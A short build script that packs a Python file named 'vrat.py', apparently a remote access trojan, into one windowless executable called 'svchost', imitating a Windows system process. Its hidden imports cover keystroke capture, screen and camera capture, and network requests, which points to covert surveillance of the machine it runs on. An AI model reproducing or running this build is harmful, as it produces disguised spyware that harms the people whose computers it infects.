pip install -r requirements_linux.txt
pyinstaller --onefile --noconsole \
  --hidden-import=psutil \
  --hidden-import=pyautogui \
  --hidden-import=requests \
  --hidden-import=pynput \
  --hidden-import=cv2 \
  --name=svchost \
  vrat.py